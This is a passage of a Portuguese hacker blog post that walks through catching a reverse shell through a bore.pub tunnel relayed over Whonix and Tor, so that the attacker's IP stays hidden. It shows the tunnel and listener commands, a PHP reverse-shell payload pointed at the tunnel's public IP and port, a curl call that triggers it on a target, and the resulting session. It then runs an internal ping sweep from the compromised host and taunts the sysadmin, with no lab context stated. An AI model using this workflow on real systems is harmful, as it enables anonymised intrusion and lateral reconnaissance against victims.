+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--code">CODE</span></div><pre><code class="hljs language-code">0000   45 00 00 40 52 a6 40 00 34 06 da c2 9f df 6e 9f   E..@R.@.4.....n.
+0010   0a 29 00 a8 1e 9b a4 3c f4 a6 d7 90 15 3c 8f 1f   .).....&lt;.....&lt;..
+0020   80 18 01 fd 35 59 00 00 01 01 08 0a 72 85 38 1e   ....5Y......r.8.
+0030   c6 36 a1 c6 <span class="paper-inline-code paper-inline-code--red">22 48 65 61 72 74 62 65 61 74 22 00</span>   .6..&quot;Heartbeat&quot;.</code></pre></div>
+
+
+<span class="paper-line-bg"><span class="paper-inline-code paper-inline-code--red">22 48 65 61 72 74 62 65 61 74 22 00</span> = HeartBeat</span>
+
+<span class="paper-line-bg">o bore envia isso pra confirmar se a conexão continua ativa...</span>
+
+
+
+<span class="paper-line-bg">Eu não sei por quanto tempo o bore mantém uma conexão ativa, mas ja usei por dias o mesmo tunnel, e continuou funcionando</span>
+<span class="paper-line-bg">perfeitamente.</span>
+
+<span class="paper-line-bg">O fluxo da conexão seria basicamente esse:</span>
+
+
+<span class="paper-line-bg">    &lt;----------------------------------TCP------------------------------------&gt;</span>
+
+<span class="paper-line-bg"><span class="paper-inline-code paper-inline-code--red">KALI</span> (client do bore estabelece conexão) -&gt; <span class="paper-inline-code paper-inline-code--red">WHONIX GATEWAY</span> -&gt; <span class="paper-inline-code paper-inline-code--red">TOR</span> -&gt; <span class="paper-inline-code paper-inline-code--red">BORE.PUB:port</span></span>
+
+<span class="paper-line-bg"><span class="paper-inline-code paper-inline-code--red">KALI</span> (cliente do bore com conexão já estabelecida) &lt;- <span class="paper-inline-code paper-inline-code--red">WHONIX GATEWAY</span> &lt;- <span class="paper-inline-code paper-inline-code--red">TOR</span> &lt;- <span class="paper-inline-code paper-inline-code--red">BORE.PUB:port</span></span>
+
+
+<span class="paper-line-bg"><span class="paper-inline-code paper-inline-code--red">é uma suruba internétalkkkkkk, suruba de pacotes, suruba de tráfego</span></span>
+
+
+<span class="paper-line-bg">E isso fica ativo até o encerramento do processo do bore!</span>
+<span class="paper-line-bg">Todos os dados que chegam na porta que o bore.pub disponibilizou pra você, é enviado pra sua maquina.</span>
+
+<span class="paper-line-bg">Veja:</span>
+
+<span class="paper-line-bg">Eu abri um tunnel com o comando:</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--bash">BASH</span></div><pre><code class="hljs language-bash">32@64~# bore <span class="hljs-built_in">local</span> 4444 --to bore.pub</code></pre></div>
+
+
+<span class="paper-line-bg">Agora vamos ver a porta que ele disponibilizou para nós!</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--code">CODE</span></div><pre><code class="hljs language-code">INFO bore_cli::client: connected to server remote_port=4788
+INFO bore_cli::client: listening at bore.pub:4788</code></pre></div>
+
+
+<span class="paper-line-bg">Ele disponibilizou a porta <span class="paper-inline-code paper-inline-code--red">4788</span>!</span>
+<span class="paper-line-bg">é essa porta que vou usar no reverse shell!</span>
+
+
+
+<span class="paper-line-bg">--[ 0x03 ]-- [ get a shell! ] ----------------------------------------------------------------------------------------------------</span>
+
+
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣲⣶⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⢠⢣⣾⠛⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀ ░██████    ░██████   ░██ ░██ ░██     </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⢠⢃⡾⠋⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀░██   ░██  ░██   ░██  ░██ ░██ ░██     </span>
+<span class="paper-line-bg">⠀⠀⠀⣠⣴⣶⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⢸⡿⡇⠀⠀⠀⠀░██        ░██     ░██ ░██ ░██ ░██     </span>
+<span class="paper-line-bg">⠀⣠⠾⠉⠁⢠⢳⡏⠎⠁⠁⠀⠀⠀⠀⠀⣼⣿⣧⣄⡀⠀⠀░██  █████ ░██     ░██ ░██ ░██ ░██     </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⣀⣈⠉⠓⢦⡀⠀⠀⠀⠀⠀⢠⡟⣿⠉⠙⠻⣷⡀░██     ██ ░██     ░██ ░██ ░██ ░██     </span>
+<span class="paper-line-bg">⡆⠀⢰⣿⣿⣿⣿⣦⠀⣹⡄⠀⠀⠀⠀⠀⠈⠉⠉⠒⢤⡀⠻⡆░██  ░███  ░██   ░██                  </span>
+<span class="paper-line-bg">⢳⣄⠘⠿⣿⣿⡿⠏⣠⣿⠁⠀⡄⠀⢀⣶⣿⣿⣷⣄⠂⡽⡄⠀ ░█████░█   ░██████   ░██ ░██ ░██     </span>
+<span class="paper-line-bg">⠀⠈⠻⠶⢖⣲⣺⠼⠛⠁⠀⠀⠹⣄⠈⠻⣿⣿⣿⠟⢀⣼⠇⠀        _                 _       _ _ </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠈⠻⣷⣖⣖⣲⣼⠿⠋⠀⠀___ ___| |_    ___    ___| |_ ___| | |</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⣿⣿⠀⣤⡄⠀⠀⠀⠀⠀⣿⣿⡎⠀⠀⣠⡄⠀| . | -_|  _|  | .'|  |_ -|   | -_| | |</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⣿⣿⢀⣿⡇⠀⠀⠀⠀⠀⣿⣿⠁⠀⣸⣿⠇⠀|_  |___|_|    |__,|  |___|_|_|___|_|_|</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⣿⣿⠀⣿⡇⠀⠀⠀⠀⠀⣿⣿⠀⢠⣿⡟⠀⠀|___|                                  </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⣿⣿⠀⣿⡇⠀⠀⠀⠀⠀⣿⣿⠀⢸⣿⡇⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⢻⡯⡇⣿⣳⠀⠀⠀⠀⠀⣿⣿⠀⢹⣾⠇⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⢸⡗⡇⢻⣾⡀⠀⠀⠀⠀⣿⣿⠀⢸⣯⡇⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⢸⣿⢣⠘⣷⣣⠀⠀⠀⢀⣏⡿⠀⢸⡷⣇⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⣿⡺⠀⠙⣷⣽⣒⣒⣮⡾⠃⠀⠰⣿⣯⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⢹⣧⠇⠀⠀⠈⠉⠉⠁⠀⠀⠀⠰⣿⣿⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠈⣿⡼⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡗⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠘⣧⡵⡀⠀⠀⠀⠀⠀⠀⢀⣎⣿⠁⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣟⢄⡀⠀⠀⢀⡠⢜⣸⠇⠀⠀⠀⠀                                      </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢷⣯⣭⣭⡵⠾⠛⠁⠀⠀⠀⠀⠀                                      </span>
+
+
+
+<span class="paper-line-bg">hora de pegar a shell através do tunnel!</span>
+
+<span class="paper-line-bg">Irei usar um shell-handler porque facilita a minha vida (<span class="paper-inline-code paper-inline-code--red">ele já sobe a interação do shell pra tty</span>).</span>
+
+<span class="paper-line-bg">repositorio do shell-handler aqui -&gt; <a href="https://github.com/brightio/penelope" class="paper-link"><span class="paper-inline-code paper-inline-code--red">brightio/penelope</span></a></span>
+
+<span class="paper-line-bg">fez a instalação do pacote? basta digitar <span class="paper-inline-code paper-inline-code--red">penelope</span>, ele já vem na porta 4444 por padrão, que foi a porta que nós abrimos</span>
+<span class="paper-line-bg">localmente para conexão loopback!</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--bash">BASH</span></div><pre><code class="hljs language-bash">32@64~# penelope                         
+[+] Listening <span class="hljs-keyword">for</span> reverse shells on 0.0.0.0:4444 -&gt; 127.0.0.1  <span class="hljs-variable">$tun1</span>  <span class="hljs-variable">$tun2</span>
+   Main Menu (m)  Payloads (p)  Clear (Ctrl-L)  Quit (q/Ctrl-C)</code></pre></div>
+
+
+<span class="paper-line-bg">Agora é triggar uma shell por ai...</span>
+
+<span class="paper-line-bg">Vou pegar o IP do servidor do bore.pub</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--bash">BASH</span></div><pre><code class="hljs language-bash"><span class="hljs-meta prompt_">32@64~# </span><span class="language-bash">ping bore.pub -c1</span>
+PING bore.pub (159.223.110.159) 56(84) bytes of data.
+64 bytes from bore.pub (159.223.110.159): icmp_seq=1 ttl=52 time=228 ms</code></pre></div>
+
+
+<span class="paper-line-bg">Pronto, o IP do bore.pub é: <span class="paper-inline-code paper-inline-code--red">159.223.110.159</span></span>
+
+
+<span class="paper-line-bg">agora é montar com a porta disponibilizada pelo server do bore! (<span class="paper-inline-code paper-inline-code--red">4788</span>)</span>
+
+<span class="paper-line-bg">Dito isso iremos usar <span class="paper-inline-code paper-inline-code--red">159.223.110.159:4788</span> para receber o shell reverso! rsrsrsrs</span>
+
+
+
+<span class="paper-line-bg">irei usar um arquivo generico de reverse-shell (<span class="paper-inline-code paper-inline-code--red">reverse-shell.php</span>), então tenho que modificar as variaveis!</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--php">PHP</span></div><pre><code class="hljs language-php"><span class="hljs-variable">$ip</span> = <span class="hljs-string">'159.223.110.159'</span>;  <span class="hljs-comment">// CHANGE THIS</span>
+<span class="hljs-variable">$port</span> = <span class="hljs-number">4788</span>;       <span class="hljs-comment">// CHANGE THIS</span></code></pre></div>
+
+
+<span class="paper-line-bg">Esse arquivo pode ser qualquer arquivo generico de reverse-shell.</span>
+<span class="paper-line-bg">agora vou triggar o shell!</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--code">CODE</span></div><pre><code class="hljs language-code">curl target.com/reverse-shell.php</code></pre></div>
+
+
+<span class="paper-line-bg">conexão recebida!</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--code">CODE</span></div><pre><code class="hljs language-code">INFO proxy{id=#root}: bore_cli::client: new connection</code></pre></div>
+
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--code">CODE</span></div><pre><code class="hljs language-code">[+] [New Reverse Shell] =&gt; &amp;&amp;&amp;&amp;&amp;&amp;&amp; 127.0.0.1 Linux-x86_64  &amp;&amp;&amp;&amp;&amp;&amp;&amp;(1000)  Session ID &lt;1&gt;</code></pre></div>
+
+
+<span class="paper-line-bg">Ótimo, conseguimos a shell e mascaramos nosso IP através do tunnel!</span>
+
+
+
+
+<span class="paper-line-bg">--[ 0x04 ]-- [ pgswp.sh : D ] ----------------------------------------------------------------------------------------------------</span>
+
+
+
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣦⢀⣷⣧⣡⣶⡄⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠈⠛⠁⠘⠋⠀⠿⠋⢻⡿⢿⣤⣴⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠃⢷⢿⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢹⡿⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⢡⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⢡⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡷⠷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀▗▖⠁▗▖▗▄▄▄▖▗▖⠀▗▖▗▄▄▄▖▗▖⠀▗▖▗▄▄▄▖</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠃⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀▐▌⣸▐▌▐▌⠀⠀⠀▐▌⠀▐▌▐▌⠀⠀⠀▐▌⠀▐▌▐▌   </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⡾⠛⠙⠚⢧⡀⠀⠀⠀⣠⠇⠀⠀⠀⠀⠀⠀⠀⠀▐▛▀▜▌▐▛▀▀▘▐▛▀▜▌▐▛▀▀▘▐▛▀▜▌▐▛▀▀▘</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⢷⣄⣄⠀⠀⠙⠒⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰▐▌⠀▐▌▐▙▄▄▖▐▌⠀▐▌▐▙▄▄▖▐▌⠀▐▌▐▙▄▄▖</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣤⠀⠈⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣘⠿⠋⣼⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠦⣄⣀⠀⠀⠀⠀⠀⠀⠀⢈⣻⣏⡁⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⣄⣤⡀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠒⣯⠹⡍⢫⡈⡷⠀⠀⠈⣧⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⢠⡖⢿⣇⠉⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡗⠺⠒⠋⠁⢀⣠⣤⣽⣦⣤⣶⡋⠙⠓⠒⣿⡖⠦⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⣠⡾⢻⣷⠾⠿⠃⠀⢙⢦⡀⠀⠀⠀⠀⠀⠀⠈⢛⣲⣆⣠⣶⣏⣉⠀⠉⠉⠻⢾⣝⡿⣦⡀⢸⣧⠀⠀⠀⠈⠉⡳⢦⡀⠀⣴⣦⣀⣀⠀⠀    </span>
+<span class="paper-line-bg">⢸⣟⣷⢤⣷⣶⢿⠀⠀⠀⠠⠝⢦⣀⠀⠀⢀⣀⣾⠟⠉⠉⠉⠉⣿⠻⠀⠀⠀⠀⠀⠈⠻⢮⡻⠿⣿⣀⠀⠀⠀⠀⠀⠙⠼⢻⡇⠞⢋⣿⠀⠀    </span>
+<span class="paper-line-bg">⢸⢉⠙⠛⢿⣧⠼⣧⣀⠀⠀⠀⠁⠈⠉⠉⠉⠀⣿⠀⠀⠀⠀⠀⠛⢀⠀⠀⡀⠀⠀⠀⠀⠈⠛⠛⠳⢮⣝⡶⣤⣄⡀⠀⠀⠀⠀⠠⠞⢳⣲⡆    </span>
+<span class="paper-line-bg">⢸⠈⢳⡀⠀⠀⠀⡏⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠍⠛⣠⣿⠀⠀⠃⢀⡀⠆⠆⠾⡄⢠⣤⣠⣝⣿⣮⠻⡝⠳⣄⡀⠀⣠⠾⠚⠉⠁    </span>
+<span class="paper-line-bg">⣸⠀⢠⠇⠀⠀⠀⣇⠀⠀⠉⠳⣤⡀⠀⠀⠀⠀⠀⢹⣷⣀⣴⣾⣟⠁⠀⠠⣀⣌⣱⣿⣿⠿⠛⠛⠉⠉⠉⠛⢿⣶⣿⠀⠈⠉⠉⠁⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⣿⠶⠋⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠉⠉⠈⠉⠁⠀⣿⡆⠀⣂⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠠⠀⢸⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠿⣄⣀⠀⠀⢠⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣁⣼⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⢿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣶⣶⣤⣤⡶⠟⠉⢸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⣙⣿⣿⣿⣿⣿⣿⠏⠀⠘⣿⣿⡇⠀⠀⠀⠘⠳⣤⡤⢤⣄⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢧⠀⠀⠀⢸⣿⠀⠀⠈⠉⠉⠋⠀⠀⠀⠈⠉⢻⣵⡀⠀⠀⣠⠋⣠⠞⠋⢩⣿⣿⣄⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⣦⣀⣀⣨⡟⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣤⣠⡇⢠⣿⠷⣦⡟⡟⠀⢻⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⢧⣤⣬⣭⣥⠤⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣾⣧⢀⣿⢰⠁⠀⡾⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⣘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠉⠈⠙⡏⢸⠀⠀⡇⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠿⠦⠤⠤⢤⣠⠤⠤⠤⠖⠚⢉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣛⡳⠶⠞⣣⡎⣀⡼⠃⠀    </span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠲⠤⠤⠤⠤⠤⠤⠤⠔⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡉⠉⢉⡁⠀⠀⠀⠀    </span>
+
+
+
+
+<span class="paper-line-bg">agora só irei fazer um pingsweep através do tunnel pra ver se tudo funciona!</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--bash">BASH</span></div><pre><code class="hljs language-bash">srvdata07@serv ~ $ ./pgswp.sh 
+192.168.0.1 is alive
+192.168.0.2 is alive
+192.168.0.5 is alive
+192.168.0.7 is alive
+192.168.0.11 is alive
+192.168.0.13 is alive
+192.168.0.61 is alive
+192.168.0.65 is alive
+192.168.0.68 is alive
+192.168.0.77 is alive
+192.168.0.83 is alive
+192.168.0.89 is alive
+192.168.0.97 is alive
+192.168.0.98 is alive
+192.168.0.113 is alive
+192.168.0.122 is alive
+192.168.0.134 is alive
+192.168.0.240 is alive
+192.168.0.249 is alive</code></pre></div>
+
+
+<span class="paper-line-bg"><span class="paper-inline-code paper-inline-code--red">a pista tá salgada ein sysadmin!</span></span>
+
+<span class="paper-line-bg">Agora pra ficar melhor ainda!</span>
+
+<span class="paper-line-bg">já no reverse shell interativo, utilize um <a href="https://github.com/hackerschoice/hackshell" class="paper-link"><span class="paper-inline-code paper-inline-code--red">hack-shell</span></a> do thehackerschoice!</span>
+
+<span class="paper-line-bg">bye! :p</span></pre>
+
+  </div>
+
+  <footer id="site-footer">
+  <div class="footer-separator"></div>
+  <div class="footer-contact"><span>xmpp: in64weTrust@pwned.life</span> <a href="#" id="omemo-modal-trigger" class="footer-link">[ omemo keys &#8594; ]</a>  <span class="footer-sep">|</span>  <span>email: thebixowithsevenheads@getgoogleoff.me</span>  <span class="footer-sep">|</span>  <a href="https://x.com/tsoi32" target="_blank" rel="noopener" class="footer-link">[ x.com/tsoi32 &#8594; ]</a></div>
+  <div class="footer-gifs">
+    <img src="../../static/media/badges/2privacy.gif" alt="2privacy.gif" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/3computer.jpg" alt="3computer.jpg" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/desktop.gif" alt="desktop.gif" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/get_euch.gif" alt="get_euch.gif" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/hatems.png" alt="hatems.png" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/hedied4u.gif" alt="hedied4u.gif" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/linux.gif" alt="linux.gif" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/retrosite.gif" alt="retrosite.gif" loading="lazy" width="88" height="31">
+    <img src="../../static/media/badges/visitmini.gif" alt="visitmini.gif" loading="lazy" width="88" height="31">
+  </div>
+  
+</footer>
+
+</div>
+  <div id="scanlines"></div>
+<script>
+document.querySelectorAll('.content .pre-wrap').forEach(function(wrap) {
+  var pre = wrap.querySelector('pre');
+  if (!pre) return;
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'copy';
+  btn.addEventListener('click', function() {
+    var code = pre.querySelector('code');
+    navigator.clipboard.writeText(code ? code.innerText : pre.innerText).then(function() {
+      btn.textContent = 'copied!';
+      btn.classList.add('copied');
+      setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+    });
+  });
+  pre.appendChild(btn);
+});
+</script>
+<div id="omemo-modal" aria-hidden="true">
+  <div class="pgp-modal-inner">
+    <div class="panel">
+      <div class="panel-header">
+        <span>OMEMO keys — in64weTrust@pwned.life</span>
+        <span class="window-controls"><span class="wbtn" id="omemo-modal-close">×</span></span>
+      </div>
+      <div class="panel-body"><pre class="omemo-keys"># device 1
+
+D1FD187B 71E50AD6 64C71535 D9C6F8F6
+B690A7B9 9C433017 10A639AF F61F9E45
+
+# device 2
+
+C862E858 EB49648C 57B44D97 4CD71D28
+ED85E8AA 77DE132D 807E8E90 7038194E
+</pre></div>
+    </div>
+  </div>
+</div>
+<script>
+(function() {
+  var _openModals = 0;
+  function bindModal(modalId, triggerId, closeBtnId) {
+    var modal    = document.getElementById(modalId);
+    var trigger  = document.getElementById(triggerId);
+    var closeBtn = document.getElementById(closeBtnId);
+    if (!modal || !trigger) return;
+    trigger.addEventListener('click', function(e) {
+      e.preventDefault();
+      modal.classList.add('active');
+      modal.setAttribute('aria-hidden', 'false');
+      _openModals++;
+      document.body.style.overflow = 'hidden';
+      document.documentElement.style.overflowY = 'hidden';
+    });
+    modal.addEventListener('click', function(e) { if (e.target === modal) close(); });
+    if (closeBtn) closeBtn.addEventListener('click', close);
+    document.addEventListener('keydown', function(e) { if (e.key === 'Escape') close(); });
+    function close() {
+      if (!modal.classList.contains('active')) return;
+      modal.classList.remove('active');
+      modal.setAttribute('aria-hidden', 'true');
+      _openModals = Math.max(0, _openModals - 1);
+      if (_openModals === 0) { document.body.style.overflow = ''; document.documentElement.style.overflowY = ''; }
+    }
+  }
+  bindModal('omemo-modal', 'omemo-modal-trigger', 'omemo-modal-close');
+})();
+</script>
+<script>
+(function() {
+  var current = null;
+  document.querySelectorAll('.home-manifesto__band-play').forEach(function(btn) {
+    var audio = new Audio(btn.getAttribute('data-audio'));
+    audio.preload = 'none';
+    audio.addEventListener('ended', function() { btn.textContent = '[>]'; });
+    btn.addEventListener('click', function() {
+      if (current && current.audio !== audio) {
+        current.audio.pause();
+        current.audio.currentTime = 0;
+        current.btn.textContent = '[>]';
+      }
+      if (audio.paused) {
+        audio.play();
+        btn.textContent = '[||]';
+        current = { audio: audio, btn: btn };
+      } else {
+        audio.pause();
+        btn.textContent = '[>]';
+        current = null;
+      }
+    });
+  });
+})();
+</script>
+</body>
+</html>
